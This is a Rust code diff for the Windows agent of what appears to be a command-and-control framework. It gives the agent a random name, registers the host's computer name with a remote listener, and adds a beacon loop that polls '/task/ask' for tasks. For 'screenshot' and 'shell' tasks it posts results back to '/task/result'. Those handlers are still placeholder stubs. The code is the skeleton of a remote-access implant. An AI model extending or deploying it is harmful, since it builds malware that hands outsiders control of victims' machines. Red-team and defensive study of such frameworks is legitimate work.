@@ -9,13 +9,14 @@ use std::{
 };
 use windows::core::{Error, HSTRING, PCWSTR, w};
 
-use crate::agents::RegisterAgent;
+use crate::agents::AgentData;
 use crate::Config;
 use crate::handlers::{
     async_handlers_windows::HRequestAsync,
     handlers_windows::{HConnect, HInternet, HRequest, HSession},
 };
 use crate::systeminfo::systeminfo_windows::{get_adapters_addresses, get_computer_name};
+use crate::utils::random::random_name;
 
 pub async fn run(config: Config) -> Result<(), Error> {
     let sleep = time::Duration::from_secs(config.sleep);
@@ -40,6 +41,7 @@ pub async fn run(config: Config) -> Result<(), Error> {
     thread::sleep(sleep);
     
     // Get agent info and register
+    let agent_name = random_name("agent".to_owned());
     let hostname = match get_computer_name() {
         Ok(name) => name,
         Err(e) => "unknown".to_string(),
@@ -51,11 +53,11 @@ pub async fn run(config: Config) -> Result<(), Error> {
         config.listener.port.to_owned(),
     );
 
-    let ra = RegisterAgent::new(hostname, listener_url);
+    let mut ra = AgentData::new(agent_name, hostname, listener_url);
     let ra_json = serde_json::to_string(&ra).unwrap();
 
     // Register agent
-    let response = match post(&mut hconnect, "/reg".to_string(), ra_json.to_string()).await {
+    let response = match post(&mut hconnect, "/reg".to_owned(), ra_json.to_string()).await {
         Ok(resp) => resp,
         Err(e) => {
             return Err(e);
@@ -63,24 +65,49 @@ pub async fn run(config: Config) -> Result<(), Error> {
     };
     println!("{response}");
 
-    thread::sleep(sleep);
+    
+    loop {
+        // TODO: Implement graceful shutdown.
 
-    // return Ok(());
+        thread::sleep(sleep);
 
-    // loop {
-    //     // TODO: Implement graceful shutdown.
+        // Get task
+        let task = match post(&mut hconnect, "/task/ask".to_owned(), ra_json.to_string()).await {
+            Ok(resp) => resp,
+            Err(e) => {
+                println!("Error fetching /task/ask: {:?}", e);
+                continue;
+            }
+        };
 
-    //     // Check task
-    //     request(
-    //         &mut state,
-    //         config.listener.proto.to_string(),
-    //         "/task".to_string(),
-    //         "GET".to_string(),
-    //         None,
-    //     );
+        // Execute task
+        let task_args = match shellwords::split(&task) {
+            Ok(args) => args,
+            Err(_) => continue,
+        };
 
-    //     thread::sleep(sleep);
-    // }
+        if task_args.len() == 0 {
+            continue;
+        }
+
+        match task_args[0].as_str() {
+            "screenshot" => {
+                ra.task_result = Some("This is Screenshot.".as_bytes().to_vec());
+                let ra_json = serde_json::to_string(&ra).unwrap();
+                post(&mut hconnect, "/task/result".to_owned(), ra_json.to_string()).await;
+            }
+            "shell" => {
+                ra.task_result = Some(format!(
+                    "This is the result for shell command `{}`.", task_args.join(" ")
+                ).as_bytes().to_vec());
+                let ra_json = serde_json::to_string(&ra).unwrap();
+                post(&mut hconnect, "/task/result".to_owned(), ra_json.to_string()).await;
+            }
+            _ => {
+                continue;
+            }
+        }
+    }
 
     hconnect.h.close();
     hsession.h.close();
